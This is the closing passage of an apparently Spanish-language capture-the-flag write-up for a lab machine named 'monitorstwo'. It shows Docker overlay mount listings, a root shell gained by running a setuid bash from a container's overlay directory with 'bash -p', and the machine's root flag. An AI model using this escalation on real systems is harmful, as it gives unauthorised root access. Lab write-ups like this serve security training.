├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged       overlay                overlay     rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7HBWVGI5TXU76FU:/var/lib/docker/overlay2/l/XKE4ZK5GJUTHXKVYS4MQMJ3NOB:/var/lib/docker/overlay2/l/3JPYTR54WWK2EX6DJ7PMMAVPQQ:/var/lib/docker/overlay2/l/YWET34PNBXR53LJY2XX7ZIXHLS:/var/lib/docker/overlay2/l/IM3MC55GS7JDB4D2EYTLAZAYLJ:/var/lib/docker/overlay2/l/6TLSBQSLTGP74QVFJVO2GOHLHL:/var/lib/docker/overlay2/l/OOXBDBKU7L25J3XQWTXLGRF5VQ:/var/lib/docker/overlay2/l/FDT56KIETI2PMNR3HGWAZ3GIGS:/var/lib/docker/overlay2/l/JE6MIEIU6ONHIWNBG36DJGDNEY:/var/lib/docker/overlay2/l/IAY73KSFENK4CC5DX5L2HCRFQJ:/var/lib/docker/overlay2/l/UDDRFLWFZYH6I5EUDCDWCOPSZX:/var/lib/docker/overlay2/l/5MM772DWMOBQZAEA4J34QYSZII,upperdir=/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/diff,workdir=/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/work,xino=off
├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged       overlay                overlay     rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE4P2JYHH:/var/lib/docker/overlay2/l/CXAW6LQU6QOKNSSNURRN2X4JEH:/var/lib/docker/overlay2/l/YWNFANZGTHCUIML4WUIJ5XNBLJ:/var/lib/docker/overlay2/l/JWCZSRNDZSQFHPN75LVFZ7HI2O:/var/lib/docker/overlay2/l/DGNCSOTM6KEIXH4KZVTVQU2KC3:/var/lib/docker/overlay2/l/QHFZCDCLZ4G4OM2FLV6Y2O6WC6:/var/lib/docker/overlay2/l/K5DOR3JDWEJL62G4CATP62ONTO:/var/lib/docker/overlay2/l/FGHBJKAFBSAPJNSTCR6PFSQ7ER:/var/lib/docker/overlay2/l/PDO4KALS2ULFY6MGW73U6QRWSS:/var/lib/docker/overlay2/l/MGUNUZVTUDFYIRPLY5MR7KQ233:/var/lib/docker/overlay2/l/VNOOF2V3SPZEXZHUKR62IQBVM5:/var/lib/docker/overlay2/l/CDCPIX5CJTQCR4VYUUTK22RT7W:/var/lib/docker/overlay2/l/G4B75MXO7LXFSK4GCWDNLV6SAQ:/var/lib/docker/overlay2/l/FRHKWDF3YAXQ3LBLHIQGVNHGLF:/var/lib/docker/overlay2/l/ZDJ6SWVJF6EMHTTO3AHC3FH3LD:/var/lib/docker/overlay2/l/W2EMLMTMXN7ODPSLB2FTQFLWA3:/var/lib/docker/overlay2/l/QRABR2TMBNL577HC7DO7H2JRN2:/var/lib/docker/overlay2/l/7IGVGYP6R7SE3WFLYC3LOBPO4Z:/var/lib/docker/overlay2/l/67QPWIAFA4NXFNM6RN43EHUJ6Q,upperdir=/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff,workdir=/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/work,xino=off
marcus@monitorstwo:/var/mail$ 
```

Y listo

```bash
marcus@monitorstwo:/var/mail$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p
bash-5.1# whoami
root
bash-5.1# 
```

## Root.txt 

Ahora vemos la flag

```bash
bash-5.1# cat root.txt 
1a56ac76986021e6ebae58a253aabaec
bash-5.1# pwd
/root
bash-5.1# 
```


